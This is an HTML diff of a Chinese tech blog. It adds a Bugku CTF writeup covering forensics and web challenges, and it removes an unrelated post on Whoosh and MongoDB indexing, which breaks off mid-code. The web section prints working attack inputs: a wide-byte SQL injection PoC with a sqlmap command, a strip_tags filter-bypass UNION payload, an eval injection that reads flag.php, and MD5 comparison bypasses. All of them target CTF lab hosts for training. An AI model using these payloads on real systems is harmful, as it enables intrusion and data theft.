@@ -140,6 +140,85 @@
         
         <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
             <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-03-06T16:40:00.000Z">2018-03-07</time>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    11 分钟 读完 (大约 1707 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2018/03/bugku-ctf-writeup1/">bugku ctf writeup1</a>
+            
+        </h1>
+        <div class="content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;此篇文章记录bugku中作者觉得比较<code>有价值</code>的writeup。</p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="linux基础问题"><a href="#linux基础问题" class="headerlink" title="linux基础问题"></a>linux基础问题</h3><p>&emsp;&emsp;将<a href="http://120.24.86.145:8002/misc/1.tar.gz" target="_blank" rel="noopener">压缩包</a>下载后可以发现一个flag文件，拿到<code>010Editor</code>查找flag却没有任何发现，后来使用<code>winhex</code>查找flag，发现了flag.txt，但这并没有什么用，所以再次查找key，此时就能找到flag。<br>flag：key{feb81d3834e2423c9903f4755464060b}</p>
+<div align="center"><br>    <img src="/images/posts/bugku/1.png"><br></div>
+
+<h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><p>&emsp;&emsp;下载压缩文件后可以发现是<code>wireshark的捕获包</code>，使用wireshark分析，追踪TCP流可以发现有一段流比较奇怪。</p>
+<div align="center"><br>    <img src="/images/posts/bugku/2.png"><br></div><br>&emsp;&emsp;将传输的数据拿去进行base64解密可以得知这个流是读取flag的数据流。<br><div align="center"><br>    <img src="/images/posts/bugku/3.png"><br></div><br>&emsp;&emsp;所以将这个蓝色部分的数据提取出来<br><div align="center"><br>    <img src="/images/posts/bugku/4.png"><br></div><br>&emsp;&emsp;调整数据流后再选择解码类型。<br><div align="center"><br>    <img src="/images/posts/bugku/5.png"><br></div><br>&emsp;&emsp;所以flag：key{8769fe393f2b998fa6a11afe2bfcd65e}<br><br>### 这么多数据包<br>&emsp;&emsp;下载后用wireshark打开，将进度条下拉到<code>灰色（传输稳定）</code>的状态，选择一条，然后追踪TCP流，<br><div align="center"><br>    <img src="/images/posts/bugku/6.png"><br></div><br><div align="center"><br>    <img src="/images/posts/bugku/7.png" width="70%"><br></div><br>&emsp;&emsp;调节流，在1735就有发现，将那串字符进行base64解码后可以发现。<br><div align="center"><br>    <img src="/images/posts/bugku/8.png"><br></div><br><div align="center"><br>    <img src="/images/posts/bugku/9.png"><br></div><br>&emsp;&emsp;所以flag：CCTF{do_you_like_sniffer}<br><br>### Linux2<br>&emsp;&emsp;题目描述：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">给你点提示吧：key的格式是KEY&#123;&#125;</span><br><span class="line">题目地址：链接: http://pan.baidu.com/s/1skJ6t7R 密码: s7jy</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;将文件下载后使用binwalk、foremost可以分离出一个看似是flag的图片，但提交却是错误。无奈只能换种思路，自己想了挺久没想出来，后来查了下writeup才发现正确的解题方式：<code>使用strings brave分析文件</code>。<br><div align="center"><br>    <img src="/images/posts/bugku/10.png"><br></div><br><div align="center"><br>    <img src="/images/posts/bugku/11.png"><br></div><br>&emsp;&emsp;所以flag：KEY{24f3627a86fc740a7f36ee2c7a1c124a}<br><br>## WEB<br>### sql注入<br>&emsp;&emsp;题目描述：<br><div align="center"><br>    <img src="/images/posts/bugku/12.png"><br></div><br>&emsp;&emsp;在测试的时候发现不管’还是”都无法判断是否存在注入，查看源代码发现页面使用<code>gb2312</code>，所以考虑<code>宽字节注入</code>，。<br><div align="center"><br>    <img src="/images/posts/bugku/13.png"><br></div><br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POC: id=1%df%27 and 1=1 -- +</span><br></pre></td></tr></table></figure><br><br><div align="center"><br>    <img src="/images/posts/bugku/14.png"><br></div><br>&emsp;&emsp;但在查询string的值时发生如下错误<br><div align="center"><br>    <img src="/images/posts/bugku/15.png"><br></div><br>&emsp;&emsp;尝试将<code>key</code>使用反引号包围，即`key`。最终得到flag。<br><div align="center"><br>    <img src="/images/posts/bugku/16.png"><br></div><br>&emsp;&emsp;所以flag：KEY{54f3320dc261f313ba712eb3f13a1f6d}<br><br>&emsp;&emsp;后来查阅了资源，<code>sqlmap进行宽字节注入</code>的payload如下：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u http://103.238.227.13:10083/?id=1%df%27</span><br></pre></td></tr></table></figure><br><br>### 域名解析<br>&emsp;&emsp;题目描述：<br>&gt;听说把 flag.bugku.com 解析到120.24.86.145 就能拿到flag<br><br>&emsp;&emsp;windows下修改本地hosts解析的方法是修改<code>C:\Windows\System32\drivers\etc</code>下的hosts文件，注意要用管理员身份修改。<br><div align="center"><br>    <img src="/images/posts/bugku/17.png"><br></div><br>&emsp;&emsp;在里面增加一条记录即可，然后访问flag.bugku.com，即可得到flag。<br><div align="center"><br>    <img src="/images/posts/bugku/18.png"><br></div>
+
+<h3 id="SQL注入测试"><a href="#SQL注入测试" class="headerlink" title="SQL注入测试"></a>SQL注入测试</h3><p>&emsp;&emsp;题目描述：</p>
+<blockquote>
+<p>访问参数为：?id=x<br>查找表为key的数据表，id=1值hash字段值</p>
+</blockquote>
+<p>&emsp;&emsp;过滤代码<br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">//过滤sql</span></span><br><span class="line">$array = <span class="hljs-keyword">array</span>(<span class="hljs-string">'table'</span>,<span class="hljs-string">'union'</span>,<span class="hljs-string">'and'</span>,<span class="hljs-string">'or'</span>,<span class="hljs-string">'load_file'</span>,<span class="hljs-string">'create'</span>,<span class="hljs-string">'delete'</span>,<span class="hljs-string">'select'</span>,<span class="hljs-string">'update'</span>,<span class="hljs-string">'sleep'</span>,<span class="hljs-string">'alter'</span>,<span class="hljs-string">'drop'</span>,<span class="hljs-string">'truncate'</span>,<span class="hljs-string">'from'</span>,<span class="hljs-string">'max'</span>,<span class="hljs-string">'min'</span>,<span class="hljs-string">'order'</span>,<span class="hljs-string">'limit'</span>);</span><br><span class="line"><span class="hljs-keyword">foreach</span> ($array <span class="hljs-keyword">as</span> $value)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> (substr_count($id, $value) &gt; <span class="hljs-number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-keyword">exit</span>(<span class="hljs-string">'包含敏感关键字！'</span>.$value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//xss过滤</span></span><br><span class="line">$id = strip_tags($id);</span><br><span class="line"></span><br><span class="line">$query = <span class="hljs-string">"SELECT * FROM temp WHERE id=&#123;$id&#125; LIMIT 1"</span>;</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;可以看出过滤得很严格，但致命的缺陷是<code>$id = strip_tags($id);</code>，它给了我们一丝可乘之机。<code>strip_tags</code>可以过滤掉html、xml、php中的标签，比如将a<code>&lt;</code>a<code>&gt;</code>nd过滤成and。</p>
+<p>&emsp;&emsp;所以payload：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10087/?id=-1 u&lt;a&gt;nion se&lt;a&gt;lect hash,2 f&lt;a&gt;rom `key` where id=1 -- +</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;flag： KEY{c3d3c17b4ca7f791f85e#$1cc72af274af4adef}</p>
+<h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p>&emsp;&emsp;题目描述：<br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">'2333，不只是本地文件包含哦~'</span>; <span class="hljs-meta">&lt;?php</span> </span><br><span class="line">    <span class="hljs-keyword">include</span> <span class="hljs-string">"waf.php"</span>; </span><br><span class="line">    <span class="hljs-keyword">include</span> <span class="hljs-string">"flag.php"</span>; </span><br><span class="line">    $a = @$_REQUEST[<span class="hljs-string">'hello'</span>]; </span><br><span class="line">    <span class="hljs-keyword">eval</span>( <span class="hljs-string">"var_dump($a);"</span>); </span><br><span class="line">    show_source(<span class="hljs-keyword">__FILE__</span>); </span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;这里一开始踏进了一个坑，测试的时候使用了<code>1)&quot;;echo 111;//</code>，但没有任何回显。</p>
+<div align="center"><br>    <img src="/images/posts/bugku/19.png"><br></div><br>&emsp;&emsp;看了writeup后才发现<code>&quot;</code>是多余的。<br><div align="center"><br>    <img src="/images/posts/bugku/20.png"><br></div><br>&emsp;&emsp;在<code>eval()</code>中可以使用<code>print_r(file(&quot;xxx&quot;))</code>的形式读取文件，所以payload就是：<code>1);print_r(file(&quot;flag.php&quot;));//</code><br><div align="center"><br>    <img src="/images/posts/bugku/21.png"><br></div>
+
+<h3 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h3><p>&emsp;&emsp;题目描述：<br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">flag In the variable ! <span class="hljs-meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line">error_reporting(<span class="hljs-number">0</span>);</span><br><span class="line"><span class="hljs-keyword">include</span> <span class="hljs-string">"flag1.php"</span>;</span><br><span class="line">highlight_file(<span class="hljs-keyword">__file__</span>);</span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'args'</span>]))&#123;</span><br><span class="line">    $args = $_GET[<span class="hljs-string">'args'</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/^\w+$/"</span>,$args))&#123;</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">"args error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">eval</span>(<span class="hljs-string">"var_dump($$args);"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;这里由于正则只匹配字母，不允许有<code>;</code>之类的符号出现，所以用上一道题的payload是没法获得flag的。但好在存在<code>$$args</code>，可以为我们打开另一道窗。</p>
+<p>&emsp;&emsp;这里介绍一个php中的特殊变量: <code>$GLOBALS</code>，它的作用如下：</p>
+<div align="center"><br>    <img src="/images/posts/bugku/22.png"><br></div><br>&emsp;&emsp;所以我们可以利用<code>$GLOBALS</code>输出flag的值，故payload：<code>http://120.24.86.145:8004/index1.php?args=GLOBALS</code>。<br><div align="center"><br>    <img src="/images/posts/bugku/23.png"><br></div>
+
+<h3 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h3><p>&emsp;&emsp;题目描述：</p>
+<blockquote>
+<p><a href="http://120.24.86.145:8002/web16/" target="_blank" rel="noopener">http://120.24.86.145:8002/web16/</a><br>听说备份是个好习惯</p>
+</blockquote>
+<p>&emsp;&emsp;访问index.php.bak可以下载源码<br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">include_once</span> <span class="hljs-string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);</span><br><span class="line">$str = strstr($_SERVER[<span class="hljs-string">'REQUEST_URI'</span>], <span class="hljs-string">'?'</span>);</span><br><span class="line">$str = substr($str,<span class="hljs-number">1</span>);</span><br><span class="line">$str = str_replace(<span class="hljs-string">'key'</span>,<span class="hljs-string">''</span>,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line"><span class="hljs-keyword">echo</span> md5($key1);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">echo</span> md5($key2);</span><br><span class="line"><span class="hljs-keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    <span class="hljs-keyword">echo</span> $flag.<span class="hljs-string">"取得flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;这里说下<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>和<code>parse_str($str)</code>的作用，<br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">访问：http:<span class="hljs-comment">//localhost/aaa/?p=222</span></span><br><span class="line">$_SERVER[<span class="hljs-string">'REQUEST_URI'</span>]  = <span class="hljs-string">"/aaa/?p=222"</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">parse_str(<span class="hljs-string">"name=Bill&amp;age=60"</span>);</span><br><span class="line"><span class="hljs-keyword">echo</span> $name.<span class="hljs-string">"&lt;br&gt;"</span>;  <span class="hljs-comment">// Bill</span></span><br><span class="line"><span class="hljs-keyword">echo</span> $age;  <span class="hljs-comment">// 60</span></span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;接下来介绍两个绕过md5检查的方法</p>
+<ul>
+<li><strong>一：使用数组的形式绕过</strong><br>&emsp;&emsp;&emsp;&emsp;因为MD5不能处理数组，MD5在对数组进行加密时会返回<code>false（null?）</code>，<code>false==false</code>无疑是成立的，所以可以构造<code>?a[]=1&amp;b[]=2</code>之类的方法绕过检查。所以，payload1如下：<div align="center"><br>  <img src="/images/posts/bugku/24.png"><br></div></li>
+<li><strong>二：找到两个md5加密后相同的值</strong><br>&emsp;&emsp;&emsp;&emsp;这个要考积累，这里我找到了两个值。<code>?key1=QNKCDZO&amp;key2=240610708</code>。<div align="center"><br>  <img src="/images/posts/bugku/25.png"><br></div>
+
+</li>
+</ul>
+<h3 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h3><p>&emsp;&emsp;题目描述：</p>
+<blockquote>
+<p>亲请在2s内计算老司机的车速是多少<br>1741242492-1033554030-217864531-2107975482+1148641444-1741096300+1743626951<em>378263735</em>21637778+861571530+717037212=?;</p>
+</blockquote>
+<p>&emsp;&emsp;附上python脚本如下，这里重要的函数是<code>eval()</code>：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup</span><br><span class="line">url=<span class="hljs-string">'http://120.24.86.145:8002/qiumingshan/'</span></span><br><span class="line">r=requests.session()</span><br><span class="line">requestpage = r.get(url)</span><br><span class="line">soup = BeautifulSoup(requestpage.content, <span class="hljs-string">'lxml'</span>)</span><br><span class="line">ans=soup.select(<span class="hljs-string">'div'</span>)[<span class="hljs-number">0</span>].get_text()[:<span class="hljs-number">-3</span>]</span><br><span class="line">print(ans)</span><br><span class="line">post=eval(ans)<span class="hljs-comment">#计算表达式的值</span></span><br><span class="line">data=&#123;<span class="hljs-string">'value'</span>:post&#125;<span class="hljs-comment">#构造post的data部分</span></span><br><span class="line">flag=r.post(url,data=data)</span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure></p>
+<h3 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h3><p>&emsp;&emsp;题目描述：</p>
+<div align="center"><br>    <img src="/images/posts/bugku/26.png"><br></div><br>&emsp;&emsp;要注意的是<code>margin</code>，这是一个数字，这也是后面的一个小坑。<br><br>&emsp;&emsp;用burpsuite抓包可以发现，http的头部有flag，并且一看就是base64编码过的。<br><div align="center"><br>    <img src="/images/posts/bugku/27.png"><br></div><br>&emsp;&emsp;最后的脚本：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="hljs-string">'http://120.24.86.145:8002/web6/'</span></span><br><span class="line">r = requests.session()</span><br><span class="line">html = r.get(url)</span><br><span class="line">bs = html.headers[<span class="hljs-string">'flag'</span>]</span><br><span class="line">key = base64.b64decode(bs)</span><br><span class="line">key = str(key, encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">print(key)</span><br><span class="line">key = key.split(<span class="hljs-string">' '</span>)[<span class="hljs-number">1</span>]</span><br><span class="line">key = str(base64.b64decode(key), encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">print(key)</span><br><span class="line">data = &#123;<span class="hljs-string">'margin'</span>:key&#125;</span><br><span class="line">html = r.post(url, data)</span><br><span class="line">print(html.text)</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;要注意的是，后面的一串还要进行一次base64解码才能得到<code>数字</code>。<br><div align="center"><br>    <img src="/images/posts/bugku/28.png"><br></div>
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
                 <time class="level-item has-text-grey" datetime="2018-03-04T16:40:00.000Z">2018-03-05</time>
                 
                 <div class="level-item">
@@ -721,62 +800,6 @@
 
 
 
-    <div class="card">
-    
-    <div class="card-content article ">
-        
-        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
-            <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2017-12-17T09:57:00.000Z">2017-12-17</time>
-                
-                <div class="level-item">
-                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
-                </div>
-                
-                
-                <span class="level-item has-text-grey">
-                    
-                    
-                    9 分钟 读完 (大约 1331 个字)
-                </span>
-                
-            </div>
-        </div>
-        
-        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
-            
-                <a class="has-link-black-ter" href="/2017/12/whoosh-mongo/">Whoosh使用及为Mongodb建立索引</a>
-            
-        </h1>
-        <div class="content">
-            <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>&emsp;&emsp;由于作者的项目中需要为数据库建立索引以便以搜索，经过考察后还是决定使用<code>Whoosh+MongoDB</code>的方案。所以这篇文章是介绍怎样使用whoosh为mongodb建立索引，网上关于这方面的文章还是相对比较少的，所以有必要记录一下。</p>
-<p>&emsp;&emsp;whoosh是原生唯一的python写的<code>全文搜索引擎</code>，虽然说whoosh性能不一定比得上lucene,sphinx,xapian等,但由于是基于python，所以扩展性极好，非常容易集成到<code>django</code>或其他框架中，而且whoosh运行消耗的资源也比lucene等引擎少，加之作者的服务器性能较弱，数据量也还不大，就选择了<code>whoosh作为搜索引擎</code>。</p>
-<h3 id="架构方案"><a href="#架构方案" class="headerlink" title="架构方案"></a>架构方案</h3><p>&emsp;&emsp;作者使用的方案是：使用<code>jieba</code>为需要索引的whoosh的字段进行<code>中文分词</code>，搜索时，whoosh只返回<code>_id</code>字段的值，然后在mongodb中查找。当然，这个whoosh也可以把所有的字段都储存起来，这样就可以直接返回搜索结果，而省去在mongodb上查找的时间，但由此引发的一个问题就是索引文件过大，是空间利用问题，而且这样做就把whoosh当成了数据库角色。所以作者放弃了这一方案。</p>
-<h3 id="建立索引"><a href="#建立索引" class="headerlink" title="建立索引"></a>建立索引</h3><p>&emsp;&emsp;这里不介绍whoosh,mongodb的安装方法，请自行搜索。</p>
-<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> whoosh.fields <span class="hljs-keyword">import</span> Schema, TEXT, ID, DATETIME</span><br><span class="line"><span class="hljs-keyword">from</span> jieba.analyse <span class="hljs-keyword">import</span> ChineseAnalyzer</span><br><span class="line"><span class="hljs-keyword">from</span> whoosh.index <span class="hljs-keyword">import</span> create_in, open_dir</span><br><span class="line"><span class="hljs-keyword">import</span> jieba</span><br><span class="line">jieba.load_userdict(<span class="hljs-string">"dict.txt"</span>)</span><br><span class="line"></span><br><span class="line">analyzer = ChineseAnalyzer()</span><br><span class="line"></span><br><span class="line">schema = Schema(</span><br><span class="line">            nid=ID(unique=<span class="hljs-keyword">True</span>, stored=<span class="hljs-keyword">True</span>),</span><br><span class="line">            url=ID(unique=<span class="hljs-keyword">True</span>, stored=<span class="hljs-keyword">False</span>),</span><br><span class="line">            date=DATETIME(unique=<span class="hljs-keyword">False</span>, stored=<span class="hljs-keyword">False</span>, sortable=<span class="hljs-keyword">True</span>),</span><br><span class="line">            title=TEXT(stored=<span class="hljs-keyword">False</span>, analyzer=analyzer),</span><br><span class="line">            content=TEXT(stored=<span class="hljs-keyword">False</span>, analyzer=analyzer)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-string">'D:/pythonCode/whoosh/index/'</span>):</span><br><span class="line">    os.mkdir(<span class="hljs-string">"D:/pythonCode/whoosh/index/"</span>)</span><br><span class="line">    create_in(<span class="hljs-string">"D:/pythonCode/whoosh/index/"</span>, schema)    <span class="hljs-comment"># 创建索引文件，需指定Schema</span></span><br><span class="line"></span><br><span class="line">ix = open_dir(<span class="hljs-string">"D:/pythonCode/whoosh/index/"</span>)    <span class="hljs-comment">#打开索引文件</span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;因为whoosh是python实现的，所以很方便的就能跟结巴结合。而结巴允许的用户自定义字典，这对专业领域的分词很有帮助，我们只需要在<code>dict.txt</code>中存放专业名词就行。</p>
-<p>&emsp;&emsp;索引首先需要定义<code>Schema</code>，<code>stored</code>代表是否存储这个字段的值，<code>sortable</code>为是否可以排序，这里因为是时间，所以我选择True，<code>analyzer</code>分词器，这里我们使用结巴中文分词器。这里再啰嗦几句，ID的值为不可分割，所以适合url、id等一类不用分割查找的项；DATETIME为时间，不用解释；这里的<code>TEXT</code>才是我们需要<code>分词、建立索引</code>的项目。</p>
-<p>&emsp;&emsp;PPS：按照whoosh官方文档，对于简单的字段即使没有指定排序，但仍可以排序，只是结果可能不是那么完美。还有一种情况就是：如果你已经创建了Schema，并且写入数据，但是你想为某个字段排序，那么你可以使用：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> whoosh <span class="hljs-keyword">import</span> sorting</span><br><span class="line"><span class="hljs-keyword">from</span> whoosh.index <span class="hljs-keyword">import</span> open_dir</span><br><span class="line"></span><br><span class="line">ix = open_dir(<span class="hljs-string">"D:/pythonCode/whoosh/index/"</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">with</span> ix.writer() <span class="hljs-keyword">as</span> w:</span><br><span class="line">    sorting.add_sortable(w, <span class="hljs-string">"date"</span>, sorting.FieldFacet(<span class="hljs-string">"date"</span>))</span><br></pre></td></tr></table></figure></p>
-<h3 id="索引数据"><a href="#索引数据" class="headerlink" title="索引数据"></a>索引数据</h3><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> whoosh.index <span class="hljs-keyword">import</span> create_in, open_dir</span><br><span class="line"></span><br><span class="line">client = pymongo.MongoClient(<span class="hljs-string">"xxx"</span>)</span><br><span class="line">db = client[<span class="hljs-string">'xxx'</span>]</span><br><span class="line">collections = db[<span class="hljs-string">'xxx'</span>]</span><br><span class="line"></span><br><span class="line">ix = open_dir(<span class="hljs-string">"D:/pythonCode/whoosh/index/"</span>)    <span class="hljs-comment">#打开索引文件</span></span><br><span class="line">_id = collections.insert(dict(item))</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">with</span> ix.writer() <span class="hljs-keyword">as</span> writer:</span><br><span class="line">    writer.update_document(</span><br><span class="line">        nid=_id.__str__(),</span><br><span class="line">        url=item[<span class="hljs-string">'url'</span>],</span><br><span class="line">        title=item[<span class="hljs-string">'title'</span>],</span><br><span class="line">        date=datetime.strptime(item[<span class="hljs-string">'date'</span>], <span class="hljs-string">'%Y-%m-%d'</span>),   <span class="hljs-comment"># 字符串化成时间格式</span></span><br><span class="line">        content=item[<span class="hljs-string">'index_content'</span>]</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;在需要建立索引的地方使用如上代码。这里注意的一点是，mongodb插入数据返回的是ObjectId，如ObjectId(“5a2e2652c0bae92df4dd2372”)，而whoosh不支持存储ObjectId类型，所以我们需要的是括号里面的字符串，所以需要使用<code>_id.__str__()</code>提取。</p>
-<h3 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h3><p>&emsp;&emsp;搜索代码如下：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> whoosh.index <span class="hljs-keyword">import</span> create_in, open_dir</span><br><span class="line"><span class="hljs-keyword">from</span> whoosh.qparser <span class="hljs-keyword">import</span> MultifieldParser, QueryParser</span><br><span class="line"><span class="hljs-keyword">from</span> whoosh <span class="hljs-keyword">import</span> scoring, sorting</span><br><span class="line"><span class="hljs-keyword">from</span> bson.objectid <span class="hljs-keyword">import</span> ObjectId</span><br><span class="line"></span><br><span class="line">client = pymongo.MongoClient(<span class="hljs-string">"xxx"</span>)</span><br><span class="line">db = 